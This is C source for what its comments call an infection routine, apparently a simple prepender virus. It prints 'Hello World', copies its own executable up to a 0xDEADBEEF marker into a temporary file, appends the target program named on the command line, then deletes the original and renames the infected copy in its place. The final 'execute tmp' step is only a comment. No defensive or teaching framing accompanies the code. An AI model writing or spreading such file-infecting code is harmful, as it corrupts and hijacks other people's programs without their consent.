#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

//print unsigned char chain in hexa
void printh(unsigned char* word, int n){

    //define variables
    char outword[n*2+1];
    int i, len;

    //define end byte
    len = strlen(word);
    if(word[len-1]=='\n')
        word[--len] = '\0';

    //translate binary to hex
    for(i = 0; i<len; i++){
        sprintf(outword+i*2, "%02X", word[i]);
    }

    //print hex
    printf("%s\n", outword);
}

int cmpn32(unsigned char* a, unsigned char* b){
    int n = 0;
    while((n < 4) && (a[n] == b[n])) n++;
    return n != 4;
}

int main(int argc, char **argv){
    printf("Hello World\n");

    //read binary file
    //write to new file
    char buffer [4];
    int fd = open(argv[0], O_RDONLY);
    int out = open("tmp", O_RDWR | O_CREAT, 0777);
    int charRead = read(fd, buffer, 4);
    char deadbeef [4] = {0xde,0xad,0xbe,0xef};

    //while not at the mid point
    while(charRead == 4 && cmpn32(buffer, deadbeef)){
        
        //write binary to new file
        write(out, buffer, 1);
        lseek(fd, -3, SEEK_CUR);

        //read binary
        charRead = read(fd, buffer, 4);

    }

    //write deadbeef
    write(out, deadbeef, 4);

    //copy uninfected file to new file
    int TBI = open(argv[1], O_RDONLY);
    while(read(TBI, buffer, 4) > 0){
        write(out, buffer, 4);
    }

    //rename file and delete old one
    remove(argv[1]);
    rename("tmp", argv[1]);

    //read binary file
    //while not at end
        //copy to tmp
    //close files

    close(fd);
    close(out);
    close(TBI);

    //execute tmp
    
    return 0;
}